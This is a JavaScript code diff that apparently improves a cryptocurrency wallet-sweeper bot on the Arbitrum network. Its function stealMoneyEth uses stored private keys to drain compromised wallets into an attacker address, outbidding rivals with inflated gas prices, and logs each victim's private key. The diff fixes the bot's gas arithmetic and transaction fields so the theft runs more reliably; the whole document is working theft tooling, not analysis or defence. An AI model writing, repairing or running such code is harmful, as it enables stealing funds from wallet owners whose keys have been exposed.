@@ -28,7 +28,7 @@ async function getBlocksEth() {
                 transactionWalletEth(transaction);
             }
         } catch (error) {
-            console.log(error)
+            console.log('Не удалось получить транзакции в сети ARBITRUM');
         }
     });
     subscription.on('error', (error) => console.log(error));
@@ -45,22 +45,24 @@ async function stealMoneyEth(address) {
     const walletKey = data[address];
     const grabFromEthBalance = web3.utils.toWei(grab.ARB, 'ether');
     const balance = await web3.eth.getBalance(address);
-    const gasPrice = await web3.eth.getGasPrice();
+    let gasPrice = await web3.eth.getGasPrice();
 
     const gasUnits = await web3.eth.estimateGas({
         "from": address,
         "to": web3.utils.toChecksumAddress(mainAddress),
         "value": balance,
     });
-    const transactionCost = 0;
+    let transactionCost = 0;
     const average = ((Math.random() * (2.6 - 2.3) + 2.3) + (Math.random() * (3 - 2.7) + 2.7)) / 2;
 
-    gasPrice =  Math.trunc(gasPrice * average);
-    transactionCost = gasUnits * gasPrice;
+    gasPrice = BigInt(Math.trunc(Number(gasPrice) * average));
+    transactionCost = gasUnits * BigInt(Math.round((Number(gasPrice) * 1.5)));
 
     for (let i = 0; i < 200; i++) {
         if (balance > grabFromEthBalance) {
             break;
+        } else if (i === 199) {
+            return;
         }
     }
 
@@ -76,6 +78,7 @@ async function stealMoneyEth(address) {
         "chainId": 42161,
         "nonce": nonce,
         "to": sendAddress,
+        "from": address,
         "value": amount,
         "gas": gasUnits,
         "maxFeePerGas": gasPrice,
@@ -84,7 +87,6 @@ async function stealMoneyEth(address) {
     };
     const signedTx = await web3.eth.accounts.signTransaction(txPrice, walletKey);
     const txHash = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-    const receipt = await web3.eth.getTransactionReceipt(txHash);
     const amountEther = web3.utils.fromWei(amount, 'ether');
-    console.log(`✅ ARBITRUM | Success withdrawal \nHASH: ${receipt.transactionHash} \n\nAMOUNT: ${amountEther} \nADDR: https://arbiscan.io/address/${address} \nPK: ${walletKey}`);
+    console.log(`✅ ARBITRUM | Success withdrawal \nHASH: ${txHash} \n\nAMOUNT: ${amountEther} \nADDR: https://arbiscan.io/address/${address} \nPK: ${walletKey}`);
 }
